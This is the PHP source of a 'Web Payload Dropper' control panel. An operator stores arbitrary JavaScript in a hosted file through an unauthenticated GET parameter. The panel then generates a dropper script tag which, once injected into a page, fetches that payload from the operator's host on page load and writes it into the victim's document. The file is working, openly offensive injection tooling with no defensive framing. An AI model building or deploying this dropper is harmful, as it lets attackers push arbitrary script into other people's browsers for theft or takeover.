<?php
	$payload_file = "../index.html";
	$simple_payload = "<script>\n\talert(\"Hello World!\");\n</script>";
	$alerts = array();

	// Check if payload file exists, if it doesn't create it and write a simple payload to it.
	if (!file_exists($payload_file)) {
		if (file_put_contents($payload_file, $simple_payload) == FALSE)
			array_push($alerts, array("danger", "Error: could not create $payload_file!"));
		else
			array_push($alerts, array("warning", "Warning: $payload_file did not exist so we created one!"));
	}

	// Update Payload file with user define paylaod
	if (!empty($_GET["payload"])) {
		if (file_put_contents($payload_file, $_GET["payload"]) == FALSE)
			array_push($alerts, array("danger", "Error updating the payload!"));
		else
			array_push($alerts, array("success", "Successfully updated the payload!"));	
	}
?>
<!doctype html>
<html lang="en">
	<head>
		<!-- Required meta tags -->
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

		<!-- Bootstrap CSS -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

		<title>WPD Panel</title>
	</head>
	<body class="bg-light">
		<!-- HEADER START -->
		<div class="container">
			<nav class="navbar navbar-dark bg-dark rounded-bottom">
				<a class="navbar-brand" href="?">Web Payload Dropper</a>
				<span class="navbar-text ml-auto mr-3">
					Version 0.1
				</span>
				<a class="btn btn-primary" href="https://github.com/ChrisDoesEverything/WPD" target="_blank" role="button">View On Github</a>
			</nav>
		</div>
		<!-- HEADER END -->

		<!-- CONTENT START -->
		<div class="container">
			<!-- ALERTS START -->
			<?php
				$alert_template= "<div class=\"alert alert-%s mt-3\" role=\"alert\">%s</div>";
				if (!empty($alerts)) {
					foreach($alerts as $alert) {
						echo(sprintf($alert_template, $alert[0], $alert[1]));
					}
				}
			?>
			<!-- ALERTS END -->
			<!-- MANAGE PAYLOAD CARD START -->
			<div class="card mt-3">
				<div class="card-header bg-info text-white">Manage Payload</div>
				<div class="card-body">
					<div class="form-group">
						<textarea class="form-control" name="payload" form="update_payload" rows="3"><?php
							echo(file_get_contents($payload_file));
						?></textarea>
					</div>
					<form method="get" id="update_payload">
						<input class="btn btn-primary btn-lg btn-block" type="submit" value="Update Payload">
					</form>
					
				</div>
			</div>
			<!-- MANAGE PAYLOAD CARD END -->
			<!-- DROPPER CARD START -->
			<div class="card mt-3">
				<div class="card-header bg-info text-white">Dropper Code</div>
				<div class="card-body">
					<div class="form-group">
						<textarea class="form-control" id="dropper" rows="3"><?php
							$dropper_template = "<script>var once = function(){once = 0;fetch(\"%s\").then(function(response) {return response.text();}).then(function(text){document.write(document.documentElement.outerHTML + text);});};document.addEventListener(\"DOMContentLoaded\", function(event) {once();});</script>";
							$uri = explode('/', explode('?', $_SERVER['REQUEST_URI'], 2)[0]);
							unset($uri[count($uri) - 2]);
							echo(sprintf($dropper_template, "http://" . $_SERVER['HTTP_HOST'] . implode($uri, '/')));
						?></textarea>
					</div>
				</div>
			</div>
			<!-- DROPPER CARD END -->
		</div>
		<!-- CONTENT END -->

		<!-- Optional JavaScript -->
		<!-- jQuery first, then Popper.js, then Bootstrap JS -->
		<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

		
	</body>
</html>